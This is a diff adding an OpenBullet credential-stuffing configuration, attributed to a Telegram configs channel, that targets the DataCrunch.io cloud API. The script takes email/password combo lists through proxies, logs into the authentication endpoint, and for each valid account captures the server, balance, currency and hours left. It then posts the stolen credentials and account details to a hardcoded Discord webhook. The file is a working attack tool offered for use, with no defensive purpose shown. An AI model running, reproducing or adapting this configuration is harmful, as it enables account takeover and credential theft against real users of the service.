@@ -1,0 +1,110 @@
+[SETTINGS]
+{
+  "Name": "DataCrunch.io",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-02T08:27:15.2931751+00:00",
+  "AdditionalInfo": "Join Us✌️",
+  "Author": "@OpenbulletConfigsOfficial (telegram)",
+  "Version": "1.2.9 Anomaly",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.datacrunch.io/auth-tokens" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.datacrunch.io" 
+  HEADER "Origin: https://cloud.datacrunch.io" 
+  HEADER "Referer: https://cloud.datacrunch.io/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "Unauthorized" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "tkn" 
+
+REQUEST GET "https://api.datacrunch.io/assets" 
+  
+  HEADER "Authorization: Bearer <tkn>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: api.datacrunch.io" 
+  HEADER "Origin: https://cloud.datacrunch.io" 
+  HEADER "Referer: https://cloud.datacrunch.io/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "[" "]" CreateEmpty=FALSE -> CAP "Server (probably)" 
+
+REQUEST GET "https://api.datacrunch.io/payment/balance" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <tkn>" 
+  HEADER "Host: api.datacrunch.io" 
+  HEADER "Origin: https://cloud.datacrunch.io" 
+  HEADER "Referer: https://cloud.datacrunch.io/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+
+PARSE "<SOURCE>" JSON "currency" CreateEmpty=FALSE -> CAP "Currency" 
+
+PARSE "<SOURCE>" JSON "amount" CreateEmpty=FALSE -> CAP "Balance" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "Server (probably)" DoesNotExist 
+    KEY "<Balance>" LessThan "50" 
+
+REQUEST GET "https://api.datacrunch.io/payment/balance/remaining" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <tkn>" 
+  HEADER "Host: api.datacrunch.io" 
+  HEADER "Origin: https://cloud.datacrunch.io" 
+  HEADER "Referer: https://cloud.datacrunch.io/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+
+PARSE "<SOURCE>" JSON "hours" CreateEmpty=FALSE -> CAP "Hours Left" 
+
+REQUEST POST "https://discordapp.com/api/webhooks/772736615348043836/fW6854sR3IHxK6DNxXH1RinQjA5RkVRP38auum-yDGKEZ_9wYv25Tf0WFYwnGvZ2T77f" 
+  CONTENT "{\"content\":\"DATACRUNCH - <USER>:<PASS> /Server (probably)-<Server (probably)> /Currency-<Currency> /Balance-<Balance> /Hours Left-<Hours Left>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
